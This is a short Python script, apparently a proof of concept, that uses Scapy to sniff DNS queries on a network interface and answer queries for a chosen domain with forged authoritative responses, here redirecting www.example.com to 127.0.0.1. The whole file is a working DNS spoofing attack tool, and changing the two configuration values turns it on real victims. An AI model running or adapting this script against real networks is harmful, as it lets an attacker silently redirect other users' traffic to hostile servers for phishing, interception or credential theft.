from scapy.all import *

# Configuration
SPOOF_DOMAIN = "www.example.com"  # Domain to spoof
SPOOF_IP = "127.0.0.1"        # IP to redirect to (localhost for PoC)
INTERFACE = "en1"             # Your network interface (check with `ifconfig`)

def dns_spoof(pkt):
    # Check if packet is a DNS query
    #print("Found packets")
    if pkt.haslayer(DNSQR) and pkt[DNS].qr == 0:
        #print("Found dns packets")
        qname = pkt[DNSQR].qname.decode().rstrip(".")
        if qname == SPOOF_DOMAIN:
            #print(f"Intercepted DNS query for {qname}")

            # Craft spoofed DNS response
            spoofed_pkt = (
                IP(dst=pkt[IP].src, src=pkt[IP].dst) /
                UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport) /
                DNS(
                    id=pkt[DNS].id,  # Match query ID
                    qr=1,            # Response flag
                    aa=1,            # Authoritative answer
                    qd=pkt[DNS].qd,  # Copy query section
                    an=DNSRR(rrname=qname, type="A", ttl=300, rdata=SPOOF_IP)
                )
            )

            # Send spoofed response
            send(spoofed_pkt, verbose=0)
            print(f"Spoofed DNS response sent: {qname} -> {SPOOF_IP}")

# Sniff DNS packets
print(f"Sniffing DNS queries for {SPOOF_DOMAIN} on {INTERFACE}...")
sniff(filter="udp port 53", iface=INTERFACE, prn=dns_spoof, store=0)